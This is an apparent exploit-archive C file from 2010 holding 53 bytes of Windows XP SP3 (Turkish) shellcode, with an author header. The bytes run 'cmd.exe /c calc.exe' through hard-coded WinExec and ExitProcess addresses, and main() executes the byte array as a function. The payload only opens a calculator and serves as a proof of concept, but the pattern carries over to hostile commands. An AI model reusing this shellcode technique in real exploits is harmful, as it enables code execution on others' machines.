/*
# Title        : win32/xp sp3 (Tr) calc.exe Shellcode 53 bytes
# Proof        : http://img178.imageshack.us/img178/548/proofxw.jpg
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Date         : 15/09/2010
# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Temenni      : Yeni Anayasamiz Hayirli Olsun
# Lakirdi      : I dont know very well assembly. but, I know I will learn its too :P
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(){

    unsigned char shellcode[]=
    "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x13\x53\xbb\xad\x23\x86\x7c"
    "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
    "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65"
    "\x78\x65";

    printf("Size = %d bytes\n", strlen(shellcode));

    ((void (*)())shellcode)();

    return 0;
}